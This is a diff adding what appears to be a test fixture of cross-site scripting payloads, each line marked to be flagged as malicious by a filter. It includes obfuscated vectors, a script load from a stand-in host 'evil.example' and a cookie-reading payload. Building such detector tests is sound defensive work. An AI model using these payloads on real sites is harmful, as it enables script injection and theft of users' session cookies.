@@ -1,0 +1,18 @@
+# Every line MUST be flagged malicious.
+<script>alert(1)</script>
+<ScRiPt src=//evil.example/x.js></ScRiPt>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<body onload="fetch('//x')">
+"><img src=x onerror=alert(document.cookie)>
+javascript:alert(1)
+java&#x09;script:alert(1)
+JaVaScRiPt&colon;alert(1)
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+<iframe src="javascript:alert(1)"></iframe>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>
+<details open ontoggle=alert(1)>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+＜script＞alert(1)＜/script＞
+<object data="x.swf">
